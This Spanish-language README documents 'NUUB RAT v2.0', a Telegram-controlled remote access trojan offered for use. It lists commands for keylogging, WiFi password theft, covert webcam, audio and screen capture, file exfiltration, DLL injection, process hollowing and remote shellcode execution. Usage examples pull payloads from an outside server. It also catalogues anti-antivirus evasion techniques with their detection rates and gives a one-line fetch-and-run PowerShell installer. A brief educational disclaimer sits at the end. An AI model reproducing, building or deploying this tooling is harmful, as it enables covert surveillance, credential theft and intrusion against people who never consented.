# NUUB RAT v2.0

Remote Access Tool con Clean Architecture, encriptación AES-256-GCM, permisos granulares de admin, audit trail, y múltiples técnicas de evasión anti-AV.

## Características

### 32 Comandos de Telegram

| Categoría | Comandos | Permiso |
|-----------|----------|---------|
| **Lectura** | `/status` `/sysinfo` `/ps` `/ls` `/cat` `/clipboard` `/locate` `/info` `/alerts` `/help` | READONLY |
| **Medio** | `/shell` `/wifi` `/getlog` `/mkdir` `/setclip` `/take_photo` `/screenshot` `/record_audio` `/send` `/alert` `/unalert` | LIMITED |
| **Admin** | `/kill` `/rm` `/downloadexec` `/take_video` `/screenrecord` `/inject` `/hollow` `/shellcode` `/uninstall` `/shutdown` | FULL |
| **Util** | `/agents` | READONLY |

### Permisos Granulares de Admin

Tres niveles de acceso configurables por admin:

| Nivel | Comandos permitidos | Uso típico |
|-------|-------------------|------------|
| **READONLY** | Solo lectura: status, sysinfo, ps, ls, cat, clipboard, locate, info, alerts, help, agents | Observador |
| **LIMITED** | Lectura + medio: shell, wifi, getlog, mkdir, setclip, photos, screenshots, send, alerts | Operador |
| **FULL** | Todo: kill, rm, downloadexec, inject, hollow, shellcode, uninstall, shutdown | Administrador |

### Audit Trail

Cada comando ejecutado se registra en `audit.log`:

```
2026-07-23 15:30:45.123 | admin=full@123456789 | chat_id=123456789 | perm=full | cmd=shell | target=pc-001 | allowed=yes
2026-07-23 15:31:00.456 | admin=readonly@999 | chat_id=999 | perm=readonly | cmd=kill | allowed=NO
```

### Evasión Anti-AV (10 técnicas)

| Nivel | Técnicas | Detección |
|-------|----------|-----------|
| **1** | AMSI Bypass, AntiDebug (6 checks), AntiVM (5 checks), ETW Patch, ThreadHideFromDebugger | ~60% |
| **2** | StringTable (rolling XOR), Obfuscate (per-site keys), ApiHash | ~40% |
| **3** | ProcessHollowing (RW→RX), ModuleStomping (RW→RX), FilelessExec (NtCreateThreadEx) | ~30% |
| **4** | DomainFronting, EncryptedC2 (AES-256-GCM), Polymorphism | ~20% |

### Seguridad

- Encriptación **AES-256-GCM** para datos exfiltrados
- **Argon2id** para derivación de keys
- **HMAC-SHA256** para verificación de integridad
- Compresión automática de archivos >10KB
- **Rolling XOR** per-process para ofuscación de strings
- **HTTPS cert verification** habilitada
- Logger sin output a consola

## Instalación

### Método 1: Instalación Remota (una línea - Recomendado)

```powershell
iex (irm https://github.com/AnderMC66/NUUB-VERSION-2/releases/latest/download/install.ps1)
```

### Método 2: Auto-Installer integrado

```bash
nuub.exe
# Sigue las instrucciones en pantalla
```

### Método 3: PowerShell local

```powershell
powershell -ExecutionPolicy Bypass -File tools\installer.ps1
```

## Configuración

### config.json

```json
{
    "telegram_bot_token": "TU_TOKEN_AQUI",
    "admin_chat_ids": [123456789],
    "admin_roles": [
        {"chat_id": 123456789, "name": "admin_principal", "permission": "full"},
        {"chat_id": 987654321, "name": "operador", "permission": "limited"},
        {"chat_id": 555555555, "name": "observador", "permission": "readonly"}
    ],
    "pc_identifier": "PC-001",
    "encryption_password": "password_secreto",
    "c2_encryption_key": "",
    "audit_log_filename": "audit.log",
    "stealth_mode": false,
    "anti_debug": true,
    "anti_vm": true,
    "etw_patch": true,
    "amsi_bypass": true,
    "process_hollowing": false,
    "module_stomping": false,
    "direct_syscall": false
}
```

### Parámetros de Evasión

| Parámetro | Tipo | Default | Descripción |
|-----------|------|---------|-------------|
| `stealth_mode` | bool | false | Activa modo silencioso (sleep en vez de exit) |
| `anti_debug` | bool | true | Detecta debuggers y herramientas de análisis |
| `anti_vm` | bool | true | Detecta VMware, VirtualBox, Sandboxie, QEMU |
| `etw_patch` | bool | true | Desactiva telemetría de Windows |
| `amsi_bypass` | bool | true | Desactiva AMSI para scripts PowerShell |
| `process_hollowing` | bool | false | Ejecuta dentro de explorer.exe |
| `module_stomping` | bool | false | Sobreescribe código de DLL legítima |
| `direct_syscall` | bool | false | Usa NtCreateThreadEx en vez de CreateThread |

## Uso de Comandos

### Comandos de Lectura (READONLY)

```
/status <target>        → Estado del agente (actividad, uptime)
/sysinfo <target>       → Info del sistema (OS, CPU, RAM, IP, disco)
/ps <target>            → Lista de procesos en ejecución
/ls <target> <path>     → Listar archivos en un directorio
/cat <target> <path>    → Leer contenido de un archivo (max 4000 chars)
/clipboard <target>     → Leer contenido del portapapeles
/locate <target>        → Geolocalización por IP con link de Google Maps
/info <target>          → Info detallada del agente
/alerts                 → Ver keywords de alerta activas
/help                   → Lista de todos los comandos
/agents                 → Ver PCs conectadas
```

### Comandos Medios (LIMITED)

```
/shell <target> <cmd>           → Ejecutar comando del sistema
/wifi <target>                  → Contraseñas WiFi guardadas
/getlog <target>                → Log de keystrokes capturados
/mkdir <target> <path>          → Crear directorio
/setclip <target> <text>        → Escribir al portapapeles
/take_photo <target>            → Foto desde la cámara
/screenshot <target>            → Captura de pantalla
/record_audio <target> <seg>    → Grabar audio (segundos)
/send <target> <path>           → Enviar archivo al admin
/alert <target> <word>          → Agregar alerta de keyword
/unalert <target> <word>        → Quitar alerta de keyword
```

### Comandos de Admin (FULL)

```
/kill <target> <pid>            → Matar proceso por PID
/rm <target> <path>             → Eliminar archivo o directorio
/downloadexec <target> <url>    → Descargar y ejecutar archivo
/take_video <target> <seg>      → Grabar video de cámara (segundos)
/screenrecord <target> <seg>    → Grabar pantalla (segundos)
/inject <target> <pid> <url>    → Inyectar DLL en proceso remoto
/hollow <target> <exe>          → Process hollowing (explorer.exe)
/shellcode <target> <url>       → Ejecutar shellcode en memoria
/uninstall <target>             → Auto-destruccion del agente
/shutdown <target>              → Apagar agente (sin eliminar)
```

### Target

Todos los comandos aceptan `<target>` que puede ser:
- **Nombre de la PC** (ej: `PC-001`) — ejecuta solo en ese agente
- **`all`** — ejecuta en todos los agentes conectados

### Ejemplos de Uso

```bash
# Info básica
/sysinfo PC-001
/screenshot all
/ps PC-001

# Shell y archivos
/shell PC-001 dir C:\Users
/cat PC-001 C:\Users\admin\Documents\secrets.txt
/send PC-001 C:\Users\admin\Desktop\report.xlsx

# Inyección de procesos
/inject PC-001 1234 http://mi-server.com/payload.dll
/hollow PC-001 explorer.exe
/shellcode PC-001 http://mi-server.com/shellcode.bin

# Keylogger
/alert PC-001 password
/getlog PC-001

# Auto-destruccion
/uninstall PC-001
```

## Seguridad de Datos

- **Encriptación**: Todos los reportes se encriptan con AES-256-GCM
- **Compresión**: Archivos >10KB se comprimen antes de enviar
- **Password**: Se usa Argon2id para derivar keys (resistente a brute-force)
- **AAD**: PC identifier se usa como Additional Authenticated Data
- **C2 Encryption**: Canal C2 encriptado con key configurable
- **Ofuscación**: Strings encriptados con rolling XOR per-process

## Compilación

### Requisitos

- Visual Studio 2022 o superior
- CMake 3.25+
- vcpkg

### Pasos

```bash
git clone <repo>
cd NUUB-VERSION-2

cmake -B build -S . -DCMAKE_TOOLCHAIN_FILE=[vcpkg-root]/scripts/buildsystems/vcpkg.cmake
cmake --build build --config Release
```

### Salida

```
build\Release\nuub.exe              → Ejecutable principal
build\tests\Release\nuub_tests.exe  → Tests (81/81)
```

## Arquitectura

```
src/
├── domain/                  # Capa de dominio (sin dependencias externas)
│   ├── entities/           # Admin (permisos granulares), Config, KeystrokeEntry
│   ├── services/           # Encryption (Argon2id+AES), Keystroke, Reporting
│   └── common/             # AntiAnalysis, AmsiBypass, EtwPatch, ProcessHollowing,
│                           # FilelessExec, ModuleStomping, EncryptedC2, AuditLogger,
│                           # StringTable, Obfuscate, DomainFronting, Polymorphism
│
├── application/             # Capa de aplicación
│   ├── commands/           # Command, Media, Shell, Inject, SelfDestruct, etc.
│   └── interfaces/         # IReporter, IMediaCapture, IShellService, etc.
│
├── infrastructure/          # Capa de infraestructura
│   ├── telegram/           # TelegramBot (permisos+audit), TelegramReporter (broadcast)
│   ├── keyboard/           # WindowsKeyListener, KeyResolver
│   ├── media/              # OpenCVMediaCapture
│   └── system/             # Persistence, Shell, Process, WiFi, FileManager,
│                           # DownloadExec, SelfDestructService
│
└── main.cpp                 # Punto de entrada con DI wiring
```

## Tests

```bash
ctest --test-dir build --build-config Release
# 81/81 tests pasan
```

### Cobertura

| Suite | Tests | Qué cubre |
|-------|-------|-----------|
| KeystrokeService | 6 | Core logging, pause/resume, keywords |
| EncryptionService | 10 | AES-GCM, key rotation, tampering |
| Admin | 6 | Auth, multi-admin, accessors |
| AdminPermission | 13 | Full/Limited/Readonly, required_permission, can_execute |
| AdminLegacy | 2 | Backward compat single/multi admin |
| AuditLogger | 6 | Log commands, denied, events, timestamps |
| CommandHandler | 5 | Target matching, start/status/shutdown |
| MediaHandler | 9 | Photo, video, audio, screenshot |
| LocationHandler | 4 | Geolocation, maps link |
| ShellHandler | 5 | Command execution, output |
| InjectHandler | 12 | Target matching, arg validation, PID checks, URL fallback |
| SelfDestructHandler | 2 | Constructor, target matching |
| SelfDestructPermission | 1 | Uninstall requires FULL |

## Disclaimer

Este software es para fines educacionales y de testing de seguridad autorizado. Úsalo solo en sistemas donde tengas autorización explícita. El autor no se hace responsable del uso indebido.

## Licencia

Uso privado. No distribuir sin autorización.
